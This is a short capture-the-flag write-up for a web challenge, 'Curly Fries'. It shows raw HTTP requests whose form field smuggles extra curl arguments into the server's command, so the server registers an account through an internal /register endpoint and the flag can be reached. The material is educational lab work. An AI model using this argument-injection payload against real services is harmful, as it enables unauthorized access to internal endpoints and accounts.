# Curly Fries

Welcome to Curly Fries Restaurant! We love our fries curly and we hope you will too. 
Just place your order, relax and watch as our team runs around the kitchen to quickly deliver your meal!

# Solution

The idea is to force `curl` to make additional POST request to `/register` endpoint. This can be done by modifing order request and adding additional URL with form data:

```
POST /order HTTP/1.1
Host: 192.168.0.27:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://192.168.0.27:5000
Connection: close
Referer: http://192.168.0.27:5000/
Upgrade-Insecure-Requests: 1


Form=Curly&Crispiness=Crispy&Condiment=Ketchup&foo=bar http://127.0.0.1:5000/register -d username=user&password=pass

```

Original form items do not even have to be included:

```
POST /order HTTP/1.1
Host: 192.168.0.27:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://192.168.0.27:5000
Connection: close
Referer: http://192.168.0.27:5000/
Upgrade-Insecure-Requests: 1

foo=bar http://127.0.0.1:5000/register -d username=user&password=pass
```

Upon successful registration, the user can log in and will be automatically redirected to `/dashboard` where the flag is hidden.
